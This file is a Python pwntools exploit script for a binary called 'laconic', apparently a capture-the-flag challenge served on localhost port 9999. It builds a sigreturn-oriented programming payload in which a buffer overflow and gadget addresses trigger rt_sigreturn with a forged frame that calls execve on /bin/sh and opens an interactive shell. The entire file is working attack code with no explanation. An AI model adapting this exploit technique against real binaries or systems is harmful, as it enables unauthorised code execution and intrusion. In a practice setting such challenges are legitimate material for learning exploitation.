from pwn import *
import sys
import os

BINARY = "./laconic"

context.binary = BINARY
context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

gdbscript = """
b _start
"""

elf = ELF(BINARY)

POP_RAX = 0x43018
SYSCALL = 0x43015
BINSH = 0x43238


def start(argv=[]):
    if args.GDB:
        return gdb.debug([BINARY], gdbscript=gdbscript)
    else:
        return remote("127.0.0.1", 9999)

def main():
    p = start()

    # Srop
    frame     = SigreturnFrame()
    frame.rax = 0x3b            # syscall number for execve
    frame.rdi = BINSH           # pointer to /bin/sh
    frame.rsi = 0x0             # NULL
    frame.rdx = 0x0             # NULL
    frame.rip = SYSCALL         # syscall address

    payload = b"A"*8
    payload += p64(POP_RAX)
    payload += p64(0xf)
    payload += p64(SYSCALL)
    payload += bytes(frame)

    p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    main()
